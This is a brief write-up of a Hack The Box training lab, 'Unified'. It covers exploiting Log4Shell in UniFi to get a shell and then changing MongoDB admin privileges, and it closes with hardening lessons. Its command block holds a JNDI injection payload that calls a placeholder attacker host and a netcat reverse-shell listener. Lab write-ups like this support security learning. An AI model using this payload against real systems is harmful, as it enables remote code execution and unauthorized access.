---
title: "Lab: Unified"
status: "Completed"
track: "HTB Starting Point"
date: "2025-09-01"
---

# Lab: Unified

## Objective
UniFi Log4Shell → shell → MongoDB privilege changes.

## Methodology
1. **Recon** — Identify service/entry point.
2. **Finding** — Confirm misconfiguration/vulnerability.
3. **Exploit** — Execute the minimal steps to gain access.
4. **Post** — Retrieve proof, note hardening steps.

## Key Commands
```bash
Burp → inject ${jndi:ldap://<attacker>/a}
nc -lvnp 4444
# then use local MongoDB to reset admin
```

## Lessons Learned
- Disable/lock down default or legacy services.
- Restrict network exposure; prefer MFA and least privilege.
- Monitor and alert on anomalous access.